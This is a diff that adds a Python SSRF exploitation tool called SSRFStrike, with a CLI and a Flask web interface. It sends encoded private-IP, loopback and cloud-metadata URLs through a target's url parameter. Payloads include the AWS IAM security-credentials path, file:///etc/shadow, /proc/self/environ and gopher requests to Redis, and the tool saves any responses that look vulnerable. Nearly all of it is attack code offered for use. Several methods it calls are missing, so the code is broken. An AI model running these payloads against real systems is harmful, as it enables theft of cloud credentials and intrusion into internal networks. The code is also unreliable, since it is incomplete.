@@ -1,0 +1,884 @@
+#!/usr/bin/env python3
+"""
+Enhanced SSRF Exploitation & Security Validation Tool
+Author: Security Research Lab
+Description: Comprehensive SSRF testing with encoding bypasses and web interface
+"""
+
+import requests
+import json
+import time
+import sys
+import argparse
+import os
+import re
+from urllib.parse import urlparse, quote
+from concurrent.futures import ThreadPoolExecutor, as_completed
+import ipaddress
+from flask import Flask, request, jsonify, render_template_string, send_file
+
+app = Flask(__name__)
+
+# Create downloads directory
+DOWNLOADS_DIR = "downloads"
+os.makedirs(DOWNLOADS_DIR, exist_ok=True)
+
+class EnhancedSSRExploiter:
+    def __init__(self, target_url, output_file=None):
+        self.target_url = target_url.rstrip('/')
+        self.output_file = output_file
+        self.results = []
+        self.vulnerabilities_found = []
+        
+        # Request session with common headers
+        self.session = requests.Session()
+        self.session.headers.update({
+            'User-Agent': 'Mozilla/5.0 (SSRF-Test-Scanner)',
+            'Accept': '*/*',
+            'Connection': 'close'
+        })
+        
+    def log(self, message, level="INFO"):
+        """Log messages with timestamps"""
+        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
+        log_entry = f"[{timestamp}] [{level}] {message}"
+        print(log_entry)
+        
+        if self.output_file:
+            with open(self.output_file, 'a', encoding='utf-8') as f:
+                f.write(log_entry + '\n')
+    
+    def sanitize_filename(self, filename):
+        """Sanitize filename for Windows compatibility"""
+        # Remove or replace invalid characters for Windows filenames
+        invalid_chars = r'[<>:"/\\|?*\x00-\x1f]'
+        sanitized = re.sub(invalid_chars, '_', filename)
+        
+        # Limit filename length
+        if len(sanitized) > 200:
+            name, ext = os.path.splitext(sanitized)
+            sanitized = name[:200-len(ext)] + ext
+            
+        return sanitized
+    
+    def test_endpoint(self, test_url, description=""):
+        """Test a single URL and return results"""
+        try:
+            full_url = f"{self.target_url}?url={quote(test_url)}"
+            
+            response = self.session.get(
+                full_url, 
+                timeout=10,
+                allow_redirects=False,
+                verify=False
+            )
+            
+            result = {
+                'description': description,
+                'test_url': test_url,
+                'target_url': full_url,
+                'status_code': response.status_code,
+                'response_time': response.elapsed.total_seconds(),
+                'content_length': len(response.content),
+                'response_text': response.text[:500] if response.text else "",  # Store first 500 chars
+                'vulnerable': False,
+                'evidence': "",
+                'saved_file': None
+            }
+            
+            # Analyze response for success indicators
+            if response.status_code == 200:
+                content = response.text.lower()
+                
+                # Check for common success indicators
+                success_indicators = [
+                    'admin', 'dashboard', 'password', 'secret', 'api',
+                    'instance', 'metadata', 'ami-id', 'local-ipv4',
+                    'redis', 'mysql', 'ssh', 'root:', 'etc/passwd',
+                    'aws', 'ec2', 'google', 'microsoft', 'azure',
+                    'html', 'body', 'div', 'span'  # Basic HTML indicators
+                ]
+                
+                found_indicators = []
+                for indicator in success_indicators:
+                    if indicator in content:
+                        found_indicators.append(indicator)
+                
+                if found_indicators:
+                    result['vulnerable'] = True
+                    result['evidence'] = f"Found indicators: {', '.join(found_indicators[:3])}"
+                    
+                    # Save the vulnerable page
+                    saved_file = self.save_vulnerability_page(
+                        test_url, response.text, description
+                    )
+                    result['saved_file'] = saved_file
+                
+                # Check for specific protocol responses
+                elif test_url.startswith('file://') and len(response.content) > 0:
+                    result['vulnerable'] = True
+                    result['evidence'] = "File protocol access successful"
+                    saved_file = self.save_vulnerability_page(
+                        test_url, response.text, description
+                    )
+                    result['saved_file'] = saved_file
+                
+                # Check for meaningful content (not just error messages)
+                elif len(response.text) > 100 and any(keyword in content for keyword in ['success', 'data', 'result', 'json']):
+                    result['vulnerable'] = True
+                    result['evidence'] = "Meaningful response content detected"
+                    saved_file = self.save_vulnerability_page(
+                        test_url, response.text, description
+                    )
+                    result['saved_file'] = saved_file
+            
+            return result
+            
+        except requests.exceptions.Timeout:
+            return {
+                'description': description,
+                'test_url': test_url,
+                'error': 'Timeout',
+                'vulnerable': False
+            }
+        except requests.exceptions.ConnectionError:
+            return {
+                'description': description,
+                'test_url': test_url,
+                'error': 'Connection failed',
+                'vulnerable': False
+            }
+        except Exception as e:
+            return {
+                'description': description,
+                'test_url': test_url,
+                'error': str(e),
+                'vulnerable': False
+            }
+
+    def generate_ip_encoding_test_cases(self):
+        """Generate comprehensive IP encoding test cases for private ranges"""
+        test_cases = []
+        
+        # Private IPv4 ranges
+        private_ranges_v4 = [
+            # RFC 1918 ranges
+            ('10.0.0.1', 'RFC1918_Class_A'),
+            ('172.16.0.1', 'RFC1918_Class_B'),
+            ('192.168.1.1', 'RFC1918_Class_C'),
+            ('127.0.0.1', 'Loopback'),
+            ('169.254.169.254', 'AWS_Metadata'),
+            ('0.0.0.0', 'All_zeros'),
+        ]
+        
+        for ip, description in private_ranges_v4:
+            # Generate all encoding variations
+            encodings = self._generate_ip_encodings(ip)
+            for encoding_type, encoded_ip in encodings.items():
+                test_url = f"http://{encoded_ip}/"
+                test_desc = f"{description}_{encoding_type}_{ip}_to_{encoded_ip}"
+                test_cases.append((test_url, test_desc))
+        
+        # Private IPv6 ranges
+        private_ranges_v6 = [
+            ('::1', 'IPv6_Loopback'),
+            ('fc00::1', 'IPv6_Unique_Local'),
+            ('fe80::1', 'IPv6_Link_Local'),
+        ]
+        
+        for ip, description in private_ranges_v6:
+            test_url = f"http://[{ip}]/"
+            test_desc = f"{description}_{ip}"
+            test_cases.append((test_url, test_desc))
+        
+        return test_cases
+    
+    def _generate_ip_encodings(self, ip):
+        """Generate hexadecimal, decimal, octal encodings for an IP address"""
+        encodings = {}
+        
+        try:
+            ip_obj = ipaddress.IPv4Address(ip)
+            ip_int = int(ip_obj)
+            
+            # Decimal encoding (single number)
+            encodings['decimal'] = str(ip_int)
+            
+            # Hexadecimal encoding (single number)
+            encodings['hexadecimal'] = f"0x{ip_int:08x}"
+            
+            # Dotted hexadecimal
+            parts = ip.split('.')
+            hex_parts = [f"0x{int(part):02x}" for part in parts]
+            encodings['dotted_hex'] = '.'.join(hex_parts)
+            
+            # Octal encoding (dotted)
+            oct_parts = [f"0{int(part):o}" for part in parts]
+            encodings['dotted_octal'] = '.'.join(oct_parts)
+            
+            # Mixed encodings
+            mixed1 = f"0x{int(parts[0]):02x}.{parts[1]}.0x{int(parts[2]):02x}.{parts[3]}"
+            mixed2 = f"0{int(parts[0]):o}.{parts[1]}.0{int(parts[2]):o}.{parts[3]}"
+            encodings['mixed_hex_dec'] = mixed1
+            encodings['mixed_oct_dec'] = mixed2
+            
+            # Alternative decimal representations
+            encodings['decimal_leading_zeros'] = f"{ip_int:010d}"
+            
+        except Exception as e:
+            self.log(f"Error generating encodings for {ip}: {str(e)}", "ERROR")
+        
+        return encodings
+    
+    def ip_encoding_attacks(self):
+        """Test IP encoding bypass attacks"""
+        self.log("Testing IP encoding bypass attacks...")
+        
+        test_cases = self.generate_ip_encoding_test_cases()
+        
+        # Additional special cases
+        special_cases = [
+            # Localhost variations
+            ('http://0x7f.0.0.1/', 'Localhost_dotted_hex'),
+            ('http://0177.0.0.1/', 'Localhost_dotted_octal'),
+            ('http://2130706433/', 'Localhost_decimal'),
+            ('http://0x7f000001/', 'Localhost_hex'),
+            ('http://127.1/', 'Localhost_shortened'),
+            ('http://127.0.1/', 'Localhost_alternative'),
+            
+            # AWS metadata variations
+            ('http://0xa9fea9fe/', 'AWS_Metadata_hex'),
+            ('http://2852039166/', 'AWS_Metadata_decimal'),
+            ('http://0xa9.0xfe.0xa9.0xfe/', 'AWS_Metadata_dotted_hex'),
+        ]
+        
+        test_cases.extend(special_cases)
+        
+        # Test all cases
+        return self._run_test_suite(test_cases, "IP Encoding Attacks")
+    
+    def internal_service_enumeration(self):
+        """Test internal service enumeration with encoded IPs"""
+        self.log("Starting internal service enumeration with encoded IPs...")
+        
+        test_cases = []
+        
+        # Localhost variations with encoding
+        localhost_targets = [
+            'http://localhost/',
+            'http://127.0.0.1/',
+            'http://0.0.0.0/',
+            'http://[::1]/',
+            'http://127.0.0.1:80/',
+            'http://localhost:8080/',
+            'http://127.1/',
+            'http://127.0.1/',
+            'http://0x7f.0.0.1/',
+            'http://0177.0.0.1/',
+            'http://2130706433/',
+            'http://0x7f000001/',
+        ]
+        
+        for target in localhost_targets:
+            test_cases.append((target, f"Localhost_access_{target.replace('://', '_').replace('/', '_').replace(':', '_')}"))
+        
+        # Common internal services with encoding
+        common_services = [
+            ('http://192.168.1.1/', 'Router_admin_interface'),
+            ('http://0xc0a80101/', 'Router_hex_encoding'),
+            ('http://3232235777/', 'Router_decimal_encoding'),
+            ('http://10.0.0.1/', 'Internal_network_gateway'),
+            ('http://0x0a000001/', 'Internal_gateway_hex'),
+            ('http://167772161/', 'Internal_gateway_decimal'),
+            ('http://172.16.0.1/', 'Corporate_network'),
+            ('http://169.254.169.254/', 'AWS_Metadata_service'),
+            ('http://0xa9fea9fe/', 'AWS_Metadata_hex'),
+            ('http://2852039166/', 'AWS_Metadata_decimal'),
+        ]
+        
+        for target, description in common_services:
+            test_cases.append((target, description))
+        
+        # Test all cases
+        return self._run_test_suite(test_cases, "Internal Service Enumeration")
+    
+    def cloud_metadata_access(self):
+        """Test cloud metadata service access with encoding"""
+        self.log("Testing cloud metadata service access with encoding...")
+        
+        test_cases = []
+        
+        # AWS EC2 Metadata Service with encodings
+        aws_endpoints = [
+            'http://169.254.169.254/latest/meta-data/',
+            'http://0xa9fea9fe/latest/meta-data/',
+            'http://2852039166/latest/meta-data/',
+            'http://169.254.169.254/latest/user-data/',
+            'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
+            'http://169.254.169.254/latest/dynamic/instance-identity/document',
+        ]
+        
+        for endpoint in aws_endpoints:
+            safe_desc = endpoint.replace('://', '_').replace('/', '_').replace(':', '_')
+            test_cases.append((endpoint, f"AWS_Metadata_{safe_desc}"))
+        
+        # Other cloud providers
+        other_cloud = [
+            'http://metadata.google.internal/computeMetadata/v1/',
+            'http://100.100.100.200/latest/meta-data/',
+            'http://0x646464c8/latest/meta-data/',
+        ]
+        
+        for endpoint in other_cloud:
+            safe_desc = endpoint.replace('://', '_').replace('/', '_').replace(':', '_')
+            test_cases.append((endpoint, f"Cloud_Metadata_{safe_desc}"))
+        
+        # Test all cases
+        return self._run_test_suite(test_cases, "Cloud Metadata Access")
+    
+    def protocol_based_attacks(self):
+        """Test dangerous protocol attacks"""
+        self.log("Testing dangerous protocol attacks...")
+        
+        test_cases = []
+        
+        # file:// protocol attacks
+        file_targets = [
+            'file:///etc/passwd',
+            'file:///etc/hosts',
+            'file:///etc/shadow',
+            'file:///proc/self/environ',
+        ]
+        
+        for target in file_targets:
+            safe_desc = target.replace('://', '_').replace('/', '_')
+            test_cases.append((target, f"File_protocol_{safe_desc}"))
+        
+        # Other dangerous protocols
+        other_protocols = [
+            'gopher://127.0.0.1:6379/_INFO',
+            'dict://127.0.0.1:11211/stats',
+            'phar:///etc/passwd',
+        ]
+        
+        for target in other_protocols:
+            safe_desc = target.replace('://', '_').replace('/', '_').replace(':', '_')
+            test_cases.append((target, f"Dangerous_protocol_{safe_desc}"))
+        
+        # Test all cases
+        return self._run_test_suite(test_cases, "Protocol-Based Attacks")
+    
+    def bypass_techniques(self):
+        """Test SSRF bypass techniques"""
+        self.log("Testing SSRF bypass techniques...")
+        
+        test_cases = []
+        
+        # DNS tricks with IP encoding
+        dns_tricks = [
+            'http://127.0.0.1.nip.io/',
+            'http://0x7f.0.0.1.nip.io/',
+            'http://2130706433.nip.io/',
+            'http://localhost.localdomain/',
+            'http://localtest.me/',
+        ]
+        
+        for target in dns_tricks:
+            safe_desc = target.replace('://', '_').replace('/', '_').replace('.', '_')
+            test_cases.append((target, f"DNS_bypass_{safe_desc}"))
+        
+        # URL parser confusion
+        parser_confusion = [
+            'http://127.0.0.1@google.com/',
+            'http://google.com@127.0.0.1/',
+            'http://0x7f.0.0.1@google.com/',
+        ]
+        
+        for target in parser_confusion:
+            safe_desc = target.replace('://', '_').replace('/', '_').replace('@', '_at_')
+            test_cases.append((target, f"Parser_confusion_{safe_desc}"))
+        
+        # Test all cases
+        return self._run_test_suite(test_cases, "Bypass Techniques")
+    
+    def _run_test_suite(self, test_cases, suite_name):
+        """Run a suite of tests with threading"""
+        self.log(f"Running {suite_name} - {len(test_cases)} test cases...")
+        
+        suite_results = []
+        vulnerable_count = 0
+        
+        with ThreadPoolExecutor(max_workers=5) as executor:  # Reduced workers to avoid overwhelming
+            future_to_test = {
+                executor.submit(self.test_endpoint, url, desc): (url, desc) 
+                for url, desc in test_cases
+            }
+            
+            for future in as_completed(future_to_test):
+                url, desc = future_to_test[future]
+                try:
+                    result = future.result()
+                    suite_results.append(result)
+                    
+                    if result.get('vulnerable'):
+                        vulnerable_count += 1
+                        self.log(f"🚨 VULNERABILITY FOUND: {desc}", "CRITICAL")
+                        self.log(f"    URL: {result['test_url']}", "CRITICAL")
+                        self.log(f"    Evidence: {result.get('evidence', 'N/A')}", "CRITICAL")
+                        if result.get('saved_file'):
+                            self.log(f"    Saved to: {result['saved_file']}", "CRITICAL")
+                        self.vulnerabilities_found.append(result)
+                    elif result.get('error'):
+                        self.log(f"❌ Error: {desc} - {result['error']}", "ERROR")
+                    else:
+                        self.log(f"✅ Tested: {desc} - Status: {result.get('status_code', 'N/A')}", "INFO")
+                        
+                except Exception as e:
+                    self.log(f"❌ Exception testing {desc}: {str(e)}", "ERROR")
+        
+        # Add suite summary to results
+        suite_summary = {
+            'suite_name': suite_name,
+            'total_tests': len(test_cases),
+            'vulnerable_tests': vulnerable_count,
+            'results': suite_results
+        }
+        self.results.append(suite_summary)
+        
+        self.log(f"Completed {suite_name}: {vulnerable_count}/{len(test_cases)} vulnerabilities found")
+        return vulnerable_count
+    
+    def run_all_tests(self):
+        """Run all test suites comprehensively"""
+        self.log("🚀 Starting COMPREHENSIVE SSRF testing...")
+        
+        start_time = time.time()
+        
+        test_suites = [
+            self.ip_encoding_attacks,
+            self.internal_service_enumeration,
+            self.cloud_metadata_access,
+            self.protocol_based_attacks,
+            self.bypass_techniques,
+        ]
+        
+        total_vulnerabilities = 0
+        
+        for suite in test_suites:
+            try:
+                vulnerabilities_in_suite = suite()
+                if vulnerabilities_in_suite is not None:
+                    total_vulnerabilities += vulnerabilities_in_suite
+                time.sleep(1)  # Be nice to the target
+            except Exception as e:
+                self.log(f"Error running {suite.__name__}: {str(e)}", "ERROR")
+        
+        elapsed_time = time.time() - start_time
+        
+        # Generate final report
+        report = self.generate_report()
+        
+        self.log(f"🎯 COMPREHENSIVE TESTING COMPLETED!")
+        self.log(f"⏰ Total time: {elapsed_time:.2f} seconds")
+        self.log(f"📊 Total vulnerabilities found: {total_vulnerabilities}")
+        self.log(f"💾 Files saved to: {DOWNLOADS_DIR}/")
+        
+        return report
+    
+
+# Enhanced HTML interface for testing
+ENHANCED_HTML_INTERFACE = """
+<!DOCTYPE html>
+<html>
+<head>
+    <title>SSRFStrike - Advanced SSRF Exploitation & Security Validation Suite - Enhanced SSRF Testing Interface</title>
+    <style>
+        body { font-family: Arial, sans-serif; margin: 40px; background: #f5f5f5; }
+        .container { max-width: 1400px; margin: 0 auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
+        .card { background: #fff; padding: 20px; margin: 15px 0; border-radius: 8px; border-left: 4px solid #27ae60; }
+        .card.danger { border-left-color: #e74c3c; }
+        .card.warning { border-left-color: #f39c12; }
+        .card.primary { border-left-color: #3498db; }
+        .form-group { margin: 15px 0; }
+        input[type="text"] { width: 70%; padding: 10px; border: 1px solid #ddd; border-radius: 4px; }
+        button { padding: 10px 20px; margin: 5px; border: none; border-radius: 4px; cursor: pointer; font-weight: bold; }
+        .btn-success { background: #27ae60; color: white; }
+        .btn-danger { background: #e74c3c; color: white; }
+        .btn-warning { background: #f39c12; color: white; }
+        .btn-primary { background: #3498db; color: white; }
+        .btn-large { padding: 15px 30px; font-size: 18px; }
+        pre { background: #2c3e50; color: #ecf0f1; padding: 15px; border-radius: 5px; overflow-x: auto; }
+        .security-info { background: #d4edda; color: #155724; padding: 15px; border-radius: 5px; margin: 15px 0; }
+        .warning { background: #fff3cd; color: #856404; padding: 15px; border-radius: 5px; margin: 15px 0; }
+        .encoding-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 15px; margin: 20px 0; }
+        .encoding-card { background: #3498db; color: white; padding: 15px; border-radius: 8px; }
+        .encoding-card.blocked { background: #e74c3c; }
+        .test-section { margin: 20px 0; padding: 15px; border: 1px solid #ddd; border-radius: 5px; }
+        .vulnerability { background: #f8d7da; color: #721c24; padding: 10px; margin: 5px 0; border-radius: 4px; }
+        .downloads-list { max-height: 300px; overflow-y: auto; border: 1px solid #ddd; padding: 10px; }
+        .progress-bar { width: 100%; background: #f0f0f0; border-radius: 10px; margin: 10px 0; }
+        .progress { height: 20px; background: #27ae60; border-radius: 10px; width: 0%; transition: width 0.3s; }
+        .status-running { color: #f39c12; font-weight: bold; }
+        .status-completed { color: #27ae60; font-weight: bold; }
+        .status-error { color: #e74c3c; font-weight: bold; }
+        .report-section { background: #e8f4fd; padding: 15px; border-radius: 5px; margin: 10px 0; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🕵️‍♂️ SSRFStrike - Advanced SSRF Exploitation & Security Validation Suite - 🛡️ Enhanced SSRF Testing Interface</h1>
+        
+        <div class="security-info">
+            <h3>🔍 Testing Capabilities:</h3>
+            <ul>
+                <li>Hexadecimal IP Encoding (0x7f.0.0.1, 0x7f000001)</li>
+                <li>Decimal IP Encoding (2130706433)</li>
+                <li>Octal IP Encoding (0177.0.0.1)</li>
+                <li>Mixed Encoding Attacks</li>
+                <li>Private IPv4/IPv6 Range Testing</li>
+                <li>Automatic Vulnerability Page Download</li>
+                <li>Comprehensive Text Reports</li>
+            </ul>
+        </div>
+
+        <div class="card primary">
+            <h2>🚀 COMPREHENSIVE TESTING</h2>
+            <div class="form-group">
+                <label for="targetUrl">Target URL to test:</label><br>
+                <input type="text" id="targetUrl" name="targetUrl" placeholder="http://vulnerable-app.com/proxy" style="width: 80%;" value="http://localhost:5000/get">
+                <button class="btn-primary btn-large" onclick="runAllTests()">🎯 RUN ALL TESTS</button>
+            </div>
+            <div id="progressSection" style="display: none;">
+                <h4 id="statusText" class="status-running">Running comprehensive tests...</h4>
+                <div class="progress-bar">
+                    <div class="progress" id="testProgress"></div>
+                </div>
+                <div id="testDetails"></div>
+            </div>
+        </div>
+
+        <div class="encoding-grid">
+            <div class="encoding-card">
+                <h3>🔢 Decimal Encoding</h3>
+                <p>127.0.0.1 → 2130706433</p>
+                <code>http://2130706433/</code>
+            </div>
+            <div class="encoding-card">
+                <h3>🔡 Hexadecimal Encoding</h3>
+                <p>127.0.0.1 → 0x7f.0.0.1</p>
+                <code>http://0x7f.0.0.1/</code>
+            </div>
+            <div class="encoding-card">
+                <h3>🔢 Octal Encoding</h3>
+                <p>127.0.0.1 → 0177.0.0.1</p>
+                <code>http://0177.0.0.1/</code>
+            </div>
+        </div>
+
+        <div class="card">
+            <h2>🎯 Manual SSRF Test</h2>
+            <form id="testForm">
+                <div class="form-group">
+                    <label for="url">Enter URL to test:</label><br>
+                    <input type="text" id="url" name="url" placeholder="http://0x7f.0.0.1/admin" style="width: 80%;">
+                    <button type="button" class="btn-success" onclick="testSSRF()">Test SSRF</button>
+                </div>
+            </form>
+        </div>
+
+        <div class="card warning">
+            <h2>⚡ Quick Encoding Tests</h2>
+            <div class="form-group">
+                <button class="btn-danger" onclick="testURL('http://0x7f.0.0.1/')">Hex Localhost</button>
+                <button class="btn-danger" onclick="testURL('http://2130706433/')">Decimal Localhost</button>
+                <button class="btn-danger" onclick="testURL('http://0177.0.0.1/')">Octal Localhost</button>
+                <button class="btn-danger" onclick="testURL('http://0xa9fea9fe/')">Hex AWS Metadata</button>
+                <button class="btn-danger" onclick="testURL('http://2852039166/')">Decimal AWS Metadata</button>
+                <button class="btn-danger" onclick="testURL('http://0xc0a80101/')">Hex Router IP</button>
+            </div>
+        </div>
+
+        <div class="card">
+            <h2>🔧 Individual Test Suites</h2>
+            <div class="form-group">
+                <button class="btn-warning" onclick="runTestSuite('encoding')">Run IP Encoding Tests</button>
+                <button class="btn-warning" onclick="runTestSuite('internal')">Run Internal Service Tests</button>
+                <button class="btn-warning" onclick="runTestSuite('cloud')">Run Cloud Metadata Tests</button>
+                <button class="btn-warning" onclick="runTestSuite('protocols')">Run Protocol Tests</button>
+                <button class="btn-warning" onclick="runTestSuite('bypass')">Run Bypass Tests</button>
+            </div>
+        </div>
+
+        <div id="results" style="display: none;">
+            <h2>📊 Test Results</h2>
+            <div id="reportSection" class="report-section" style="display: none;">
+                <h3>📄 Generated Reports</h3>
+                <div id="reportLinks"></div>
+            </div>
+            <pre id="resultOutput"></pre>
+        </div>
+
+        <div class="card">
+            <h2>💾 Downloaded Files</h2>
+            <div class="downloads-list" id="downloadsList">
+                {% for file in downloaded_files %}
+                <div class="vulnerability">
+                    <strong>{{ file.filename }}</strong><br>
+                    <small>Saved: {{ file.timestamp }}</small><br>
+                    <a href="/download/{{ file.filename }}" target="_blank">Download</a>
+                </div>
+                {% endfor %}
+            </div>
+        </div>
+    </div>
+
+    <script>
+        function runAllTests() {
+            const targetUrl = document.getElementById('targetUrl').value;
+            if (!targetUrl) {
+                alert('Please enter a target URL');
+                return;
+            }
+
+            document.getElementById('progressSection').style.display = 'block';
+            document.getElementById('statusText').className = 'status-running';
+            document.getElementById('statusText').textContent = 'Running comprehensive tests...';
+            document.getElementById('testProgress').style.width = '0%';
+            document.getElementById('testDetails').innerHTML = '';
+
+            fetch(`/run-all-tests?target=${encodeURIComponent(targetUrl)}`)
+                .then(response => response.json())
+                .then(data => {
+                    document.getElementById('testProgress').style.width = '100%';
+                    
+                    if (data.success) {
+                        document.getElementById('statusText').className = 'status-completed';
+                        document.getElementById('statusText').textContent = `✅ Testing Completed! Found ${data.vulnerabilities_found} vulnerabilities`;
+                        document.getElementById('resultOutput').textContent = JSON.stringify(data.report, null, 2);
+                        document.getElementById('results').style.display = 'block';
+                        
+                        // Show report links
+                        if (data.text_report_path) {
+                            document.getElementById('reportSection').style.display = 'block';
+                            document.getElementById('reportLinks').innerHTML = `
+                                <p><strong>📄 Text Report:</strong> <a href="/download/${data.text_report_filename}" target="_blank">${data.text_report_filename}</a></p>
+                            `;
+                        }
+                        
+                        // Refresh downloads list
+                        setTimeout(() => location.reload(), 1000);
+                    } else {
+                        document.getElementById('statusText').className = 'status-error';
+                        document.getElementById('statusText').textContent = '❌ Testing Failed: ' + (data.error || 'Unknown error');
+                    }
+                })
+                .catch(error => {
+                    document.getElementById('statusText').className = 'status-error';
+                    document.getElementById('statusText').textContent = '❌ Testing Error: ' + error;
+                });
+        }
+
+        function testSSRF() {
+            const url = document.getElementById('url').value;
+            const targetUrl = document.getElementById('targetUrl').value;
+            fetch(`/test-ssrf?url=${encodeURIComponent(url)}&target=${encodeURIComponent(targetUrl)}`)
+                .then(response => response.json())
+                .then(data => {
+                    document.getElementById('resultOutput').textContent = JSON.stringify(data, null, 2);
+                    document.getElementById('results').style.display = 'block';
+                    if(data.vulnerable) {
+                        setTimeout(() => location.reload(), 1000);
+                    }
+                })
+                .catch(error => {
+                    document.getElementById('resultOutput').textContent = 'Error: ' + error;
+                    document.getElementById('results').style.display = 'block';
+                });
+        }
+
+        function testURL(url) {
+            document.getElementById('url').value = url;
+            testSSRF();
+        }
+
+        function runTestSuite(suite) {
+            const targetUrl = document.getElementById('targetUrl').value;
+            fetch(`/run-tests?suite=${suite}&target=${encodeURIComponent(targetUrl)}`)
+                .then(response => response.json())
+                .then(data => {
+                    document.getElementById('resultOutput').textContent = JSON.stringify(data, null, 2);
+                    document.getElementById('results').style.display = 'block';
+                    if(data.vulnerabilities_found > 0) {
+                        setTimeout(() => location.reload(), 1000);
+                    }
+                })
+                .catch(error => {
+                    document.getElementById('resultOutput').textContent = 'Error: ' + error;
+                    document.getElementById('results').style.display = 'block';
+                });
+        }
+    </script>
+</body>
+</html>
+"""
+
+@app.route('/')
+def index():
+    """Main enhanced testing interface"""
+    # Get list of downloaded vulnerability files
+    downloaded_files = []
+    try:
+        for filename in os.listdir(DOWNLOADS_DIR):
+            filepath = os.path.join(DOWNLOADS_DIR, filename)
+            stat = os.stat(filepath)
+            downloaded_files.append({
+                'filename': filename,
+                'timestamp': time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(stat.st_mtime))
+            })
+    except Exception as e:
+        print(f"Error reading downloads: {e}")
+    
+    return render_template_string(ENHANCED_HTML_INTERFACE, downloaded_files=downloaded_files)
+
+@app.route('/download/<filename>')
+def download_file(filename):
+    """Download vulnerability file"""
+    try:
+        return send_file(os.path.join(DOWNLOADS_DIR, filename), as_attachment=True)
+    except Exception as e:
+        return jsonify({'error': str(e)}), 404
+
+@app.route('/test-ssrf')
+def test_ssrf():
+    """Test individual SSRF vulnerability"""
+    url = request.args.get('url')
+    target = request.args.get('target', 'http://localhost:5000/get')
+    
+    if not url:
+        return jsonify({'error': 'URL parameter required'}), 400
+    
+    exploiter = EnhancedSSRExploiter(target)
+    result = exploiter.test_endpoint(url, f"Manual test: {url}")
+    
+    return jsonify(result)
+
+@app.route('/run-tests')
+def run_tests():
+    """Run test suites"""
+    suite = request.args.get('suite', 'all')
+    target = request.args.get('target', 'http://localhost:5000/get')
+    
+    exploiter = EnhancedSSRExploiter(target)
+    
+    if suite == 'all':
+        report = exploiter.run_all_tests()
+    elif suite == 'encoding':
+        exploiter.ip_encoding_attacks()
+        report = exploiter.generate_report()
+    elif suite == 'internal':
+        exploiter.internal_service_enumeration()
+        report = exploiter.generate_report()
+    elif suite == 'cloud':
+        exploiter.cloud_metadata_access()
+        report = exploiter.generate_report()
+    elif suite == 'protocols':
+        exploiter.protocol_based_attacks()
+        report = exploiter.generate_report()
+    elif suite == 'bypass':
+        exploiter.bypass_techniques()
+        report = exploiter.generate_report()
+    else:
+        return jsonify({'error': 'Invalid test suite'}), 400
+    
+    return jsonify({
+        'suite': suite,
+        'vulnerabilities_found': len(exploiter.vulnerabilities_found),
+        'report': report
+    })
+
+@app.route('/run-all-tests')
+def run_all_tests():
+    """Run all comprehensive tests"""
+    target = request.args.get('target', 'http://localhost:5000/get')
+    
+    try:
+        exploiter = EnhancedSSRExploiter(target)
+        report = exploiter.run_all_tests()
+        
+        # Save text report and get the path
+        text_report_path = exploiter.save_text_report(report)
+        text_report_filename = os.path.basename(text_report_path) if text_report_path else None
+        
+        return jsonify({
+            'success': True,
+            'vulnerabilities_found': len(exploiter.vulnerabilities_found),
+            'report': report,
+            'text_report_path': text_report_path,
+            'text_report_filename': text_report_filename
+        })
+    except Exception as e:
+        return jsonify({
+            'success': False,
+            'error': str(e)
+        }), 500
+
+def main():
+    """Main function with mode selection"""
+    parser = argparse.ArgumentParser(description='Enhanced SSRF Exploitation & Security Validation Tool')
+    parser.add_argument('target', nargs='?', help='Target URL (e.g., http://localhost:5000/vulnerable-proxy)')
+    parser.add_argument('-o', '--output', help='Output file for results')
+    parser.add_argument('--suite', 
+                       choices=['all', 'encoding', 'internal', 'cloud', 'protocols', 'bypass'],
+                       default='all', help='Test suite to run')
+    parser.add_argument('--mode', choices=['cli', 'web'], default='cli',
+                       help='Run in CLI mode or start web interface (default: cli)')
+    
+    args = parser.parse_args()
+    
+    if args.mode == 'web' or not args.target:
+        # Web interface mode
+        print("🌐 Starting Enhanced SSRF Testing Web Interface...")
+        print("📁 Vulnerability pages will be saved to: downloads/")
+        print("📄 Comprehensive text reports will be generated automatically")
+        print("🔗 Access the interface at: http://localhost:8080")
+        print("🎯 Use the 'RUN ALL TESTS' button for comprehensive testing")
+        app.run(host='0.0.0.0', port=8080, debug=False)
+    else:
+        # CLI mode
+        exploiter = EnhancedSSRExploiter(args.target, args.output)
+        
+        try:
+            if args.suite == 'all':
+                report = exploiter.run_all_tests()
+            else:
+                # Run specific suite
+                if args.suite == 'encoding':
+                    exploiter.ip_encoding_attacks()
+                elif args.suite == 'internal':
+                    exploiter.internal_service_enumeration()
+                elif args.suite == 'cloud':
+                    exploiter.cloud_metadata_access()
+                elif args.suite == 'protocols':
+                    exploiter.protocol_based_attacks()
+                elif args.suite == 'bypass':
+                    exploiter.bypass_techniques()
+                
+                report = exploiter.generate_report()
+            
+            # Exit code based on findings
+            if report['scan_info']['total_vulnerabilities'] > 0:
+                sys.exit(1)  # Vulnerabilities found
+            else:
+                sys.exit(0)  # No vulnerabilities found
+                
+        except KeyboardInterrupt:
+            exploiter.log("Scan interrupted by user", "WARNING")
+            sys.exit(130)
+        except Exception as e:
+            exploiter.log(f"Unexpected error: {str(e)}", "ERROR")
+            sys.exit(1)
+
+# Remove the run_cli_mode() function entirely
+
+if __name__ == '__main__':
+    main()
